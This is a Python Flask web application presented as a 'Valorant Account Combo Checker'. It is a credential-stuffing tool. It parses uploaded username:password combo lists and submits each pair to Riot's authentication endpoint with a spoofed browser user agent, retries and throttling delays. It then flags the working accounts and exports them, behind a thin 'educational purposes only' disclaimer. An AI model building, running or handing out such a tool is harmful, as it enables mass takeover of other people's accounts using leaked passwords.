#!/usr/bin/env python3
"""
Valorant Account Combo Checker - Web Application
A modern web-based tool for checking Valorant account combinations

DISCLAIMER: This tool is for educational purposes only.
Only use this tool on accounts you own or have explicit permission to test.
Unauthorized access to accounts is illegal and violates terms of service.
"""

from flask import Flask, render_template, request, jsonify, session
import requests
import time
import json
import threading
from typing import Dict, List, Tuple, Optional
import logging
import os
from werkzeug.utils import secure_filename
import uuid

app = Flask(__name__)
app.secret_key = 'valorant_combo_checker_secret_key_' + str(uuid.uuid4())

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'csv'}
MAX_FILE_SIZE = 16 * 1024 * 1024  # 16MB

# Ensure upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Request settings
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
VALORANT_AUTH_URL = "https://auth.riotgames.com/api/v1/authorization"

# Global storage for active sessions
active_sessions = {}

class ComboChecker:
    """Core combo checking functionality"""
    
    def __init__(self, session_id: str, delay: float = 2.0):
        self.session_id = session_id
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': USER_AGENT,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        self.is_checking = False
        self.stop_checking = False
        self.results = []
        self.progress = {'current': 0, 'total': 0}
        
    def check_single_combo(self, username: str, password: str) -> Dict:
        """Check a single username/password combination"""
        result = {
            'username': username,
            'password': password,
            'status': 'unknown',
            'message': '',
            'timestamp': time.time()
        }
        
        try:
            auth_data = {
                'type': 'auth',
                'username': username,
                'password': password,
                'remember': False
            }
            
            response = self._make_request(VALORANT_AUTH_URL, auth_data)
            
            if response is None:
                result['status'] = 'error'
                result['message'] = 'Request failed'
                return result
                
            if response.status_code == 200:
                response_data = response.json()
                
                if 'access_token' in response_data or response_data.get('type') == 'response':
                    result['status'] = 'valid'
                    result['message'] = 'Authentication successful'
                else:
                    result['status'] = 'invalid'
                    result['message'] = 'Invalid credentials'
                    
            elif response.status_code == 429:
                result['status'] = 'rate_limited'
                result['message'] = 'Rate limited - try again later'
                
            elif response.status_code in [401, 403]:
                result['status'] = 'invalid'
                result['message'] = 'Invalid credentials'
                
            else:
                result['status'] = 'error'
                result['message'] = f'HTTP {response.status_code}'
                
        except requests.exceptions.Timeout:
            result['status'] = 'timeout'
            result['message'] = 'Request timed out'
            
        except requests.exceptions.ConnectionError:
            result['status'] = 'connection_error'
            result['message'] = 'Connection failed'
            
        except Exception as e:
            result['status'] = 'error'
            result['message'] = f'Unexpected error: {str(e)}'
            
        return result
    
    def _make_request(self, url: str, data: Dict) -> Optional[requests.Response]:
        """Make HTTP request with retry logic"""
        for attempt in range(MAX_RETRIES):
            try:
                response = self.session.post(
                    url,
                    json=data,
                    timeout=REQUEST_TIMEOUT
                )
                return response
                
            except requests.exceptions.RequestException:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)
                    
        return None
    
    def check_combo_list(self, combos: List[Tuple[str, str]]):
        """Check a list of username/password combinations"""
        self.is_checking = True
        self.stop_checking = False
        self.results = []
        self.progress = {'current': 0, 'total': len(combos)}
        
        for i, (username, password) in enumerate(combos):
            if self.stop_checking:
                break
                
            self.progress['current'] = i + 1
            
            result = self.check_single_combo(username, password)
            self.results.append(result)
            
            if i < len(combos) - 1 and not self.stop_checking:
                time.sleep(self.delay)
                
        self.is_checking = False
    
    def stop_checking_process(self):
        """Stop the current checking process"""
        self.stop_checking = True

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def parse_combo_file(file_path: str) -> List[Tuple[str, str]]:
    """Parse combo file and return list of (username, password) tuples"""
    combos = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line_num, line in enumerate(file, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                    
                # Support multiple formats
                if ':' in line:
                    parts = line.split(':', 1)
                elif ',' in line:
                    parts = line.split(',', 1)
                elif ';' in line:
                    parts = line.split(';', 1)
                elif '\t' in line:
                    parts = line.split('\t', 1)
                else:
                    continue
                    
                if len(parts) == 2:
                    username = parts[0].strip()
                    password = parts[1].strip()
                    if username and password:
                        combos.append((username, password))
                        
    except Exception as e:
        raise Exception(f"Error reading file: {e}")
        
    return combos

@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')

@app.route('/api/check_single', methods=['POST'])
def check_single():
    """API endpoint for single account check"""
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    
    if not username or not password:
        return jsonify({'error': 'Username and password are required'}), 400
    
    session_id = str(uuid.uuid4())
    checker = ComboChecker(session_id)
    result = checker.check_single_combo(username, password)
    
    return jsonify(result)

@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    """API endpoint for file upload"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and file.filename and allowed_file(file.filename):
        filename = secure_filename(str(file.filename))
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        
        try:
            combos = parse_combo_file(file_path)
            session['uploaded_file'] = file_path
            session['combo_count'] = len(combos)
            
            return jsonify({
                'success': True,
                'filename': filename,
                'combo_count': len(combos)
            })
        except Exception as e:
            return jsonify({'error': f'Error parsing file: {str(e)}'}), 400
    
    return jsonify({'error': 'Invalid file type. Only .txt and .csv files are allowed'}), 400

@app.route('/api/start_batch', methods=['POST'])
def start_batch():
    """API endpoint to start batch checking"""
    data = request.get_json()
    delay = float(data.get('delay', 2.0))
    
    if 'uploaded_file' not in session:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file_path = session['uploaded_file']
    if not os.path.exists(file_path):
        return jsonify({'error': 'Uploaded file not found'}), 400
    
    try:
        combos = parse_combo_file(file_path)
        session_id = str(uuid.uuid4())
        
        checker = ComboChecker(session_id, delay)
        active_sessions[session_id] = checker
        
        # Start checking in background thread
        def check_thread():
            checker.check_combo_list(combos)
        
        thread = threading.Thread(target=check_thread, daemon=True)
        thread.start()
        
        session['session_id'] = session_id
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'total_combos': len(combos)
        })
        
    except Exception as e:
        return jsonify({'error': f'Error starting batch check: {str(e)}'}), 500

@app.route('/api/batch_status/<session_id>')
def batch_status(session_id):
    """API endpoint to get batch checking status"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    
    return jsonify({
        'is_checking': checker.is_checking,
        'progress': checker.progress,
        'results': checker.results,
        'completed': not checker.is_checking and checker.progress['current'] > 0
    })

@app.route('/api/stop_batch/<session_id>', methods=['POST'])
def stop_batch(session_id):
    """API endpoint to stop batch checking"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    checker.stop_checking_process()
    
    return jsonify({'success': True})

@app.route('/api/export_results/<session_id>')
def export_results(session_id):
    """API endpoint to export results"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    
    if not checker.results:
        return jsonify({'error': 'No results to export'}), 400
    
    # Generate export data
    export_data = {
        'summary': {
            'total': len(checker.results),
            'valid': sum(1 for r in checker.results if r['status'] == 'valid'),
            'invalid': sum(1 for r in checker.results if r['status'] == 'invalid'),
            'errors': sum(1 for r in checker.results if r['status'] not in ['valid', 'invalid'])
        },
        'results': checker.results
    }
    
    return jsonify(export_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)